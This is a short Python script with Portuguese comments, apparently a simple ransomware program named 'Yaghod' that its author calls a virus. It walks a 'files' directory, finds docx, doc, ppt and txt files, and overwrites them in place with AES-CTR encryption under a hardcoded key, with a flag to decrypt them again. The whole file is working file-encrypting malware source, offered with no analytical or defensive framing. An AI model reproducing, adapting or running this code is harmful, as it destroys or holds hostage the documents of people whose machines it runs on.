#!/usr/bin/python3.6
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os

def change_files(filename, cryptoFn, block_size=16):

    with open(filename, 'r+b') as _file:
        raw_value = _file.read(block_size)
        while raw_value:
            cipher_value = cryptoFn(raw_value)
            if len(raw_value) != len(cipher_value):
                raise ValueError('O valor cifrado {} tem um tamanho diferente do valor plano {}'.format(len(cipher_value), len(raw_value)))

            _file.seek(- len(raw_value), 1)
            _file.write(cipher_value)
            raw_value = _file.read(block_size)

def discover(initial_path):
    
    extensions = [
        'docx', 'doc', 'ppt', 'txt',
    ]

    for dirpath, dirs, files in os.walk(initial_path):
        for _file in files:
            absopath = os.path.abspath(os.path.join(dirpath, _file))
            ext = absopath.split('.')[-1]
            if ext in extensions:
                yield absopath


if __name__ == '__main__':
    x = discover(os.getcwd())
    for i in x:
        print(i)

HARDCODED_KEY = 'YAGHO VULGO O MELHOR VIRUS HAHAH'

def get_parser():
    parser = argparse.ArgumentParser(description="Yaghod")
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('Yagho Encriptando seu pc, utilize a senha "{}"'.format(HARDCODED_KEY))
        key = input("Digite a senha > ")
    else:
        if HARDCODED_KEY:
            key1 = HARDCODED_KEY
            key = str.encode(key1)
            
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]

    for currentDir in startDirs:
        for filename in discover(currentDir):
            change_files(filename, cryptFn)
    
    #limpar chave da memoria

    for _ in range(10000):
        pass

    if not decrypt:
        pass
        

if __name__ == '__main__':
    main()
